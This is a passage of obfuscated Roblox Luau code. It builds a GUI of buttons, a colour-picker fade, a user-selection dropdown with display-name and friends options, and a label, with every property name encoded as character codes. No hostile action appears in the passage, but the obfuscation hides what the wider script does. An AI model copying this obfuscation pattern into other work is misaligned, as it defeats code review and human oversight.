_llza[_sc(52,51,50)][_sc(84,101,120,116)]=[[Apply]];
_llza[_sc(52,51,50)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(52,51,50)][_sc(90,73,110,100,101,120)]=2;
_llza[_sc(52,51,50)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(52,51,51)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(52,51,50)]);
_llza[_sc(52,51,51)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(52,51,52)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(52,50,99)]);
_llza[_sc(52,51,52)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=1;
_llza[_sc(52,51,52)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,51,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,51,52)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(52,51,52)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(52,51,52)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(52,51,52)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,51,52)][_sc(83,105,122,101)]=UDim2.new(0, 100, 1, 0);
_llza[_sc(52,51,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,51,52)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(52,51,52)][_sc(78,97,109,101)]=[[cancel]];
_llza[_sc(52,51,53)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(52,51,52)]);
_llza[_sc(52,51,53)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 2);
_llza[_sc(52,51,53)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 2);
_llza[_sc(52,51,53)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(52,51,53)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(52,51,54)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(52,51,52)]);
_llza[_sc(52,51,54)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(52,51,54)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(52,51,54)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(52,51,54)][_sc(78,97,109,101)]=[[buttonFrame]];
_llza[_sc(52,51,54)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(52,51,55)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(52,51,54)]);
_llza[_sc(52,51,55)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(52,51,55)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(52,51,55)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(52,51,56)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(52,51,54)]);
_llza[_sc(52,51,56)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,51,56)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(52,51,56)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,51,56)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(52,51,56)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,51,56)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,51,57)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(52,51,56)]);
_llza[_sc(52,51,57)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(52,51,57)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(52,51,97)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(52,51,52)]);
_llza[_sc(52,51,97)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,51,97)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,51,97)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(52,51,97)][_sc(84,101,120,116,83,116,114,111,107,101,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,51,97)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(52,51,97)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(52,51,97)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,51,97)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,51,97)][_sc(84,101,120,116)]=[[Cancel]];
_llza[_sc(52,51,97)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(52,51,97)][_sc(90,73,110,100,101,120)]=2;
_llza[_sc(52,51,97)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(52,51,98)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(52,51,97)]);
_llza[_sc(52,51,98)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(52,51,99)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(51,102,101)]);
_llza[_sc(52,51,99)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,51,99)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(52,51,99)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,51,99)][_sc(78,97,109,101)]=[[colorpickerFade]];
_llza[_sc(52,51,99)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,51,99)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,51,100)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(52,51,99)]);
_llza[_sc(52,51,100)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(52,51,100)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(52,51,101)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49)]);
_llza[_sc(52,51,101)][_sc(86,105,115,105,98,108,101)]=false;
_llza[_sc(52,51,101)][_sc(90,73,110,100,101,120)]=1000000010;
_llza[_sc(52,51,101)][_sc(83,105,122,101)]=UDim2.new(0, 162, 0, 100);
_llza[_sc(52,51,101)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,51,101)][_sc(78,97,109,101)]=[[Dropdown]];
_llza[_sc(52,51,101)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,51,101)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=0.99;
_llza[_sc(52,51,101)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.60349, 0, 0.36966, 0);
_llza[_sc(52,51,101)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,51,102)]=Instance.new(_sc(85,73,76,105,115,116,76,97,121,111,117,116),_llza[_sc(52,51,101)]);
_llza[_sc(52,51,102)][_sc(83,111,114,116,79,114,100,101,114)]=Enum.SortOrder.LayoutOrder;
_llza[_sc(52,52,48)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(52,51,101)]);
_llza[_sc(52,52,48)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(52,52,48)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=1;
_llza[_sc(52,52,48)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,52,48)][_sc(78,97,109,101)]=[[dropdownSelectAll]];
_llza[_sc(52,52,48)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,52,48)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,52,49)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(52,52,48)]);
_llza[_sc(52,52,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(26, 26, 26);
_llza[_sc(52,52,49)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(52,52,49)][_sc(84,101,120,116,83,105,122,101)]=12;
_llza[_sc(52,52,49)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,52,49)][_sc(83,105,122,101)]=UDim2.new(0.5, 0, 1, 0);
_llza[_sc(52,52,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(52,52,49)][_sc(84,101,120,116)]=[[Select All]];
_llza[_sc(52,52,49)][_sc(78,97,109,101)]=[[selectall]];
_llza[_sc(52,52,50)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(52,52,49)]);
_llza[_sc(52,52,50)][_sc(86,105,115,105,98,108,101)]=false;
_llza[_sc(52,52,50)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,52,50)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(52,52,50)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,52,50)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(52,52,50)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,52,50)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,52,51)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(52,52,50)]);
_llza[_sc(52,52,51)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(52,52,51)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(52,52,52)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(52,52,49)]);
_llza[_sc(52,52,52)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(52,52,53)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(52,52,48)]);
_llza[_sc(52,52,53)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(26, 26, 26);
_llza[_sc(52,52,53)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(52,52,53)][_sc(84,101,120,116,83,105,122,101)]=12;
_llza[_sc(52,52,53)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,52,53)][_sc(83,105,122,101)]=UDim2.new(0.5, 0, 1, 0);
_llza[_sc(52,52,53)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(52,52,53)][_sc(84,101,120,116)]=[[Unselect All]];
_llza[_sc(52,52,53)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.5, 0, 0, 0);
_llza[_sc(52,52,53)][_sc(78,97,109,101)]=[[unselectall]];
_llza[_sc(52,52,54)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(52,52,53)]);
_llza[_sc(52,52,54)][_sc(86,105,115,105,98,108,101)]=false;
_llza[_sc(52,52,54)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,52,54)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(52,52,54)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,52,54)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(52,52,54)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,52,54)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,52,55)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(52,52,54)]);
_llza[_sc(52,52,55)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(52,52,55)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(52,52,56)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(52,52,53)]);
_llza[_sc(52,52,56)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(52,52,57)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(52,51,101)]);
_llza[_sc(52,52,57)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(52,52,57)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(52,52,57)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,52,57)][_sc(78,97,109,101)]=[[dropdownUsers]];
_llza[_sc(52,52,57)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,52,57)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,52,97)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(52,52,57)]);
_llza[_sc(52,52,97)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(52,52,97)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(26, 26, 26);
_llza[_sc(52,52,97)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(52,52,97)][_sc(84,101,120,116,83,105,122,101)]=12;
_llza[_sc(52,52,97)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,52,97)][_sc(83,105,122,101)]=UDim2.new(0.5, 0, 1, 0);
_llza[_sc(52,52,97)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(52,52,97)][_sc(84,101,120,116)]=[[Show Display]];
_llza[_sc(52,52,97)][_sc(78,97,109,101)]=[[display]];
_llza[_sc(52,52,98)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(52,52,97)]);
_llza[_sc(52,52,98)][_sc(86,105,115,105,98,108,101)]=false;
_llza[_sc(52,52,98)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,52,98)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(52,52,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,52,98)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(52,52,98)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,52,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,52,99)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(52,52,98)]);
_llza[_sc(52,52,99)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(52,52,99)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(52,52,100)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(52,52,97)]);
_llza[_sc(52,52,100)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(52,52,101)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(52,52,57)]);
_llza[_sc(52,52,101)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(26, 26, 26);
_llza[_sc(52,52,101)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(52,52,101)][_sc(84,101,120,116,83,105,122,101)]=12;
_llza[_sc(52,52,101)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,52,101)][_sc(83,105,122,101)]=UDim2.new(0.5, 0, 1, 0);
_llza[_sc(52,52,101)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(52,52,101)][_sc(84,101,120,116)]=[[Show Friends]];
_llza[_sc(52,52,101)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.5, 0, 0, 0);
_llza[_sc(52,52,101)][_sc(78,97,109,101)]=[[friends]];
_llza[_sc(52,52,102)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(52,52,101)]);
_llza[_sc(52,52,102)][_sc(86,105,115,105,98,108,101)]=false;
_llza[_sc(52,52,102)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,52,102)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(52,52,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,52,102)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(52,52,102)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,52,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,53,48)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(52,52,102)]);
_llza[_sc(52,53,48)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(52,53,48)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(52,53,49)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(52,52,101)]);
_llza[_sc(52,53,49)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(52,53,50)]=Instance.new(_sc(83,99,114,111,108,108,105,110,103,70,114,97,109,101),_llza[_sc(52,51,101)]);
_llza[_sc(52,53,50)][_sc(90,73,110,100,101,120)]=999999999;
_llza[_sc(52,53,50)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,53,50)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,53,50)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(52,53,50)][_sc(78,97,109,101)]=[[dropdownScrolling]];
_llza[_sc(52,53,50)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0.2, 0);
_llza[_sc(52,53,50)][_sc(83,99,114,111,108,108,66,97,114,73,109,97,103,101,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,53,50)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(52,53,50)][_sc(83,99,114,111,108,108,66,97,114,84,104,105,99,107,110,101,115,115)]=0;
_llza[_sc(52,53,50)][_sc(65,99,116,105,118,101)]=true;
_llza[_sc(52,53,50)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(52,53,51)]=Instance.new(_sc(85,73,76,105,115,116,76,97,121,111,117,116),_llza[_sc(52,53,50)]);
_llza[_sc(52,53,51)][_sc(83,111,114,116,79,114,100,101,114)]=Enum.SortOrder.LayoutOrder;
_llza[_sc(52,53,52)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(52,53,50)]);
_llza[_sc(52,53,52)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(52,53,52)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(52,53,52)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(52,53,52)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(52,53,52)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(52,53,52)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,53,52)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(52,53,52)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(52,53,52)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(52,53,53)]=Instance.new(_sc(73,109,97,103,101,76,97,98,101,108),_llza[_sc(52,53,52)]);
_llza[_sc(52,53,53)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,53,53)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,53,53)][_sc(73,109,97,103,101)]=[[rbxasset://textures/ui/GuiImagePlaceholder.png]];
_llza[_sc(52,53,53)][_sc(83,105,122,101)]=UDim2.new(0, 20, 1, 0);
_llza[_sc(52,53,53)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,53,53)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(52,53,53)][_sc(78,97,109,101)]=[[image]];
_llza[_sc(52,53,53)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(1, -20, 0, 0);
_llza[_sc(52,53,53)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(52,53,54)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(52,53,52)]);
_llza[_sc(52,53,54)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,53,54)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,53,54)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(52,53,54)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(52,53,54)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(52,53,54)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(52,53,54)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,53,54)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,53,54)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(52,53,54)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(52,53,54)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(52,53,55)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(52,53,54)]);
_llza[_sc(52,53,55)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 6);
_llza[_sc(52,53,56)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(52,53,54)]);
_llza[_sc(52,53,56)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(52,53,57)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(52,53,52)]);
_llza[_sc(52,53,57)][_sc(86,105,115,105,98,108,101)]=false;
_llza[_sc(52,53,57)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,53,57)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(52,53,57)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,53,57)][_sc(78,97,109,101)]=[[buttonFade]];
_llza[_sc(52,53,57)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,53,57)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,53,97)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(52,53,57)]);
_llza[_sc(52,53,97)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(52,53,97)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(52,53,98)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(49)]);
_llza[_sc(52,53,98)][_sc(86,105,115,105,98,108,101)]=false;
_llza[_sc(52,53,98)][_sc(90,73,110,100,101,120)]=1999999999;
_llza[_sc(52,53,98)][_sc(83,105,122,101)]=UDim2.new(0, 450, 0, 80);
_llza[_sc(52,53,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(52,53,98)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,53,98)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(52,53,98)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.75448, 0, 0.67079, 0);
_llza[_sc(52,53,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,53,99)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(52,53,98)]);
_llza[_sc(52,53,99)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(52,53,99)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(52,53,99)][_sc(82,105,99,104,84,101,120,116)]=true;
_llza[_sc(52,53,99)][_sc(84,101,120,116,83,99,97,108,101,100)]=true;
_llza[_sc(52,53,99)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(52,53,99)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/PressStart2P.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(52,53,99)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(52,53,99)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
